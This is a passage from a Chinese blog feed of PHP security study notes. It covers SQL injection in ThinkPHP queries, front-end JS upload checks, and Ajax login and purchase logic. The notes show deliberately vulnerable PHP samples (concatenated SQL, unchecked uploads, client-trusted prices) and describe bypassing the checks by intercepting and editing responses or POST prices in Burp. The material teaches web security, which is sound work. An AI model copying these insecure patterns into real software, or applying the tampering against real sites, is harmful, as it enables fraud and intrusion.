class="string">&#x27;gid&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时我们可以很容易的看出，这种写法是存在SQL注入漏洞的，id参数是可控的，我们可以依此进行sql注入</p><p>但是如果将写法换成如下，就不可进行sql注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">n_sqlin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;?get.x&quot;</span>);</span><br><span class="line">    <span class="variable">$coon</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;syguestbook&#x27;</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from sy_message where id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = (row = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;gid&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体原因如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527195411872.png" alt="image-20240527195411872"></p><p>同时，我们还有下面的写法，进行数据过滤，以控制sql注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">m_sqlin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;?get.x&#x27;</span>);</span><br><span class="line"><span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;sy_message&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;id&#x27;</span>,<span class="variable">$id</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个语句其实就和<code>select from</code>一致，但是它内置了过滤方法以防止sql注入，这种过滤法则其实就是封装在框架中的，这也体现出了框架的优势，通过完全不同的语法，实现同一样的功能，同时还进行了过滤处理，但是如果你依然使用自己的方法瞎写，就和框架没有关系了，但是大部分人都会使用框架自带的方法，不然使用框架干什么？</p><h2 id="TP历史漏洞"><a href="#TP历史漏洞" class="headerlink" title="TP历史漏洞"></a>TP历史漏洞</h2><p>关于历史漏洞，我们的利用思路可以如下</p><p>首先先看框架类型，比如我们可以使用<code>wappalyzer</code>插件进行中间价识别，先判断相关的框架</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527202112893.png" alt="image-20240527202112893"></p><p>然后再通过报错信息找到相关的版本号（黑盒），白盒直接看代码，找到version即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912094030617-2003108838.png" alt="1645085245558-36989422-d322-47c0-87e2-9bdb4a65d921.png"></p><p>之后搜索相关的TP版本有没有爆出过相关漏洞，通过网上的信息构造攻击代码</p><p>如果是黑盒，当构造的代码无法达到预期的效果市，那么很有可能是开发者在相应的代码地区打上了补丁，如果是白盒测试，可以直接看漏洞代码处有没有被做相应的修改，如果进行了修改，那么就不能利用历史漏洞进行攻击</p><p>但是对于我们这种水平，没有办法挖出0day，所以我们也只能找历史漏洞，遇到打了补丁的，提桶跑路吧🤣🤣🤣</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> PHP开发 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ThinkPHP框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发-JS前端逻辑登录、Ajax数据传输</title>
      <link href="/post/542e9af2.html"/>
      <url>/post/542e9af2.html</url>
      
        <content type="html"><![CDATA[<h2 id="JS前端认证"><a href="#JS前端认证" class="headerlink" title="JS前端认证"></a>JS前端认证</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>首先依旧是确定表单html代码，如下所示</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>  <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;uploadfile&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;checkFileExt(this.value)&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;sub&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;开始上传&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后引入<code>js</code>代码。这个<code>js</code>代码相当于别人封装好的一系列代码，我们通过<code>script</code>进行文件包含，然后我们就可以直接使用<code>script</code>中<code>js</code>声明好的函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/jquery-1.12.4.min.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后紧接着就是在<code>js</code>代码中进行相关的验证</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkFileExt</span>(<span class="params">filename</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> flag = <span class="literal">false</span>; <span class="comment">//状态</span></span><br><span class="line">        <span class="keyword">var</span> arr = [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>];</span><br><span class="line">        <span class="comment">//取出上传文件的扩展名</span></span><br><span class="line">        <span class="comment">//1.jpg index=1，ext=jpg</span></span><br><span class="line">    <span class="comment">//lastIndexOf是返回最后一个字符&quot;.&quot;的下标</span></span><br><span class="line">    <span class="comment">//从指定位置复制字符串</span></span><br><span class="line">        <span class="keyword">var</span> index = filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ext = filename.<span class="title function_">substr</span>(index+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//比较</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.<span class="property">length</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ext == arr[i])</span><br><span class="line">            &#123;</span><br><span class="line">                flag = <span class="literal">true</span>; <span class="comment">//一旦找到合适的，立即退出循环</span></span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;上传的文件符合要求！&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//条件判断</span></span><br><span class="line">        <span class="keyword">if</span>(!flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;上传的文件不符合要求，请重新选择！&quot;</span>);</span><br><span class="line">            location.<span class="title function_">reload</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这个功能之前我们也实现过，主要是实现对文件上传的后缀名进行验证，符合要求的我们才进行上传，但是我们是用PHP实现的，如下代码所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">@<span class="variable">$file_name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">//获取上传文件类型</span></span><br><span class="line">@<span class="variable">$file_type</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="comment">//获取上传文件大小</span></span><br><span class="line">@<span class="variable">$file_size</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="comment">//获取上传文件临时文件名</span></span><br><span class="line">@<span class="variable">$file_tmpname</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="comment">//获取上传文件是否错误</span></span><br><span class="line">@<span class="variable">$file_error</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file_name</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file_type</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file_size</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file_tmpname</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file_error</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$file_error</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(@<span class="variable">$_FILES</span>[<span class="string">&quot;upload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;../upload/&quot;</span> . @<span class="variable">$_FILES</span>[<span class="string">&quot;upload&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件存储在: &quot;</span> . <span class="string">&quot;upload/&quot;</span> . @<span class="variable">$_FILES</span>[<span class="string">&quot;upload&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从上我们可以看出，我们既可以通过PHP实现，也可以通过JS进行实现，但是两个的区别在于，PHP的代码是看不见的，只能通过黑盒测试（去猜），JS的代码是我们可以看见的，是白盒测试，也就是我们平常说的，一种是前端验证，一种是后端验证</p><p>至于如何判断是否采用JS验证，我们可以查看页面源码，看看有没有相关的代码，同时要注意，任何可疑的JS文件都要查看一下，因为有可能被封装成js文件，通过文件包含进行引用</p><p>同时，我们可以通过禁用JS来限制这部分代码，有相关插件，火狐上我装的是这个，具体浏览器可以去搜一下，都有相关插件的</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527110535840.png" alt="image-20240527110535840"></p><h2 id="Ajax数据传输"><a href="#Ajax数据传输" class="headerlink" title="Ajax数据传输"></a>Ajax数据传输</h2><p>Ajax（Asynchronous Javascript And XML），即是异步的JavaScript和XML，Ajax其实就是浏览器与服务器之间的一种异步通信方式，它可以异步地向服务器发送请求，在等待响应的过程中，不会阻塞当前页面，在这种情况下，浏览器可以做自己的事情。直到成功获取响应后，浏览器才开始处理响应数据。</p><p>使用Ajax需要提前导入<code>jquery-1.12.4.min.js</code>文件，即<code>&lt;script src=&quot;../js/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;</code></p><p>下面使用Ajax进行数据传递</p><p>login.html</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Ajax登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">帐号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pass&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/jquery-1.12.4.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&#x27;button&#x27;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">url</span>:<span class="string">&#x27;ajax.php&#x27;</span>,             <span class="comment">//发给ajax.php文件。</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">dataType</span>:<span class="string">&#x27;json&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">myUname</span>:$(<span class="string">&#x27;.user&#x27;</span>).<span class="title function_">val</span>(),</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">myUpass</span>:$(<span class="string">&#x27;.pass&#x27;</span>).<span class="title function_">val</span>()</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//console.log(res);</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(res.<span class="property">infoCode</span>==<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&#x27;登录成功&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&#x27;登录失败&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ajax.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;myUname&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;myUpass&#x27;</span>];</span><br><span class="line"><span class="variable">$success</span>=<span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>==<span class="string">&#x27;xiaodi&#x27;</span> &amp;&amp; <span class="variable">$password</span>==<span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">1</span>; <span class="comment">//成功登录</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">0</span>; <span class="comment">//失败登录</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);</span><br></pre></td></tr></table></figure><p>当我们进行登录的时候，我们控制台的返回如下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/6f65df2ae81b026759af48f667aa6b62.png" alt="6f65df2ae81b026759af48f667aa6b62"></p><p>同时，通过抓包也可以看到返回值</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527112927975.png" alt="image-20240527112927975"></p><p>对于我们上面书写的代码，对于下块区域</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527113142347.png" alt="image-20240527113142347"></p><p>我们很容易发现判断是否success是在前端判断的，通过infoCode来判断是否登录成功，这个时候我们就可以拦截从服务器发回前端页面的数据，将infoCode改为1，就可以绕过前端验证</p><p>右键点击<code>Do intercept</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527113402206.png" alt="image-20240527113402206"></p><p>将服务器发回的包拦截，修改<code>InfoCode</code>，实现绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527113533937.png" alt="image-20240527113533937"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527113549939.png" alt="image-20240527113549939"></p><h2 id="商品购买案例"><a href="#商品购买案例" class="headerlink" title="商品购买案例"></a>商品购买案例</h2><h3 id="设计一"><a href="#设计一" class="headerlink" title="设计一"></a>设计一</h3><p>设计一通过商品的价格以前端设置的为准，后端接受前端传回来的价格进行运算，判断能否执行购买</p><p>user.php-前端页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;购买设计1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=&quot;iphone.jpg&quot; width=&quot;270&quot; height=&quot;270&quot; alt=&quot;&quot;/&gt;&lt;br&gt;</span><br><span class="line">价格：8888&lt;br&gt;</span><br><span class="line">数量：&lt;input type=&quot;text&quot; class=&quot;num&quot;&gt;</span><br><span class="line">&lt;button&gt;购买&lt;/button&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script src=&quot;js/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(&#x27;button&#x27;).click(function () &#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type:&#x27;post&#x27;,</span><br><span class="line">            url:&#x27;shop.php&#x27;,</span><br><span class="line">            dataType:&#x27;json&#x27;,</span><br><span class="line">            data:&#123;</span><br><span class="line">            //前端传回数据</span><br><span class="line">                price:&#x27;8888&#x27;,</span><br><span class="line">                number:$(&#x27;.num&#x27;).val()</span><br><span class="line"> </span><br><span class="line">            &#125;,</span><br><span class="line">success:function (res) &#123;</span><br><span class="line">                //console.log(res);</span><br><span class="line">                if(res.code==1)&#123;</span><br><span class="line">                    alert(&#x27;购买成功&#x27;);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    alert(&#x27;购买失败&#x27;);</span><br><span class="line"> </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>shop.php-进行验证</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$success</span>=<span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line"><span class="variable">$price</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;number&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span>=<span class="variable">$price</span>*<span class="variable">$num</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$m</span>&lt;<span class="number">10000</span>)&#123;</span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;code&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;code&#x27;</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527135600600.png" alt="image-20240527135600600"></p><p>由于是书写在前端的，同时判断是否购买成功也是在前端，所以我们这里有两种绕过方式，其中一种和上面一样，使用<code>Do intercept</code>，将code改为1</p><p>第二种方式，由于POST是从前端接受传入的数据，所以我们可以更改price，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527140240144.png" alt="image-20240527140240144"></p><h3 id="设计二"><a href="#设计二" class="headerlink" title="设计二"></a>设计二</h3><p>设计二我们将商品价格设置以数据库设置价格为准，数据接受价格后运算</p><p>user1.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">include(&#x27;/config/conn1.php&#x27;);</span><br><span class="line">//</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$sql=&quot;select * from shop where id=1&quot;;</span><br><span class="line"> </span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line">while($row=mysql_fetch_array($result))&#123;</span><br><span class="line">    $imgsrc=$row[&#x27;imgsrc&#x27;];</span><br><span class="line">    $price=$row[&#x27;price&#x27;];</span><br><span class="line">    echo &quot;&lt;img src=&#x27;$imgsrc&#x27; width=&#x27;270&#x27; height=&#x27;270&#x27; alt=&#x27;&#x27;/&gt;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;价格：$price&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;数量：&lt;input type=&#x27;text&#x27; class=&#x27;num&#x27;&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;button&gt;购买&lt;/button&gt;&quot;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;购买设计2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script src=&quot;js/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(&#x27;button&#x27;).click(function () &#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type:&#x27;post&#x27;,</span><br><span class="line">            url:&#x27;shop1.php&#x27;,</span><br><span class="line">            dataType:&#x27;json&#x27;,</span><br><span class="line">            data:&#123;</span><br><span class="line">                price:&lt;?php echo $price;?&gt;,</span><br><span class="line">                number:$(&#x27;.num&#x27;).val()</span><br><span class="line"> </span><br><span class="line">            &#125;,</span><br><span class="line">            success:function (res) &#123;</span><br><span class="line">                //console.log(res);</span><br><span class="line">                if(res.code==1)&#123;</span><br><span class="line">                    alert(&#x27;购买成功&#x27;);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    alert(&#x27;购买失败&#x27;);</span><br><span class="line"> </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>shop1.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$success</span>=<span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line"><span class="variable">$price</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;number&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span>=<span class="variable">$price</span>*<span class="variable">$num</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$m</span>&lt;<span class="number">10000</span>)&#123;</span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;code&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;code&#x27;</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看起来规范了很多，但是我们发现shop.php并没有实质性的改变，只是你没办法修改它前端页面显示的价格，在传输过程中，<code>$price</code>仍然接收的是<code>$_POST</code>传进来的，我们依旧可以通过bp抓包进行价格修改，进而实现绕过</p><h3 id="设计三"><a href="#设计三" class="headerlink" title="设计三"></a>设计三</h3><p>价格进行写死，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527141411480.png" alt="image-20240527141411480"></p><p>此时无论怎么修改bp抓的包，都无法进行修改，但是还有一个问题，没对数量进行限制，如果我输入小数，是不是这个逻辑也能判断成功呢？如果我输入负数，是不是更能成功呢？所以我们应该同时对数量进行正则限制，限制只能输入正整数</p><p>至于如何判断是否是前端验证，我们可以观察返回值是否有<code>json、code、msgbox</code>等关键字，类似于<code>&#123;&quot;code&quot;:200,&quot;data&quot;:&quot;111111111&quot;,&quot;msg&quot;:&#39;&quot;&#125;</code>这种形式，<strong>一般都是前端验证，可以尝试绕过</strong></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> PHP开发 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS前端 </tag>
            
            <tag> Ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发-登录验证之Cookie、Session、验证码</title>
      <link href="/post/3aa4702a.html"/>
      <url>/post/3aa4702a.html</url>
      
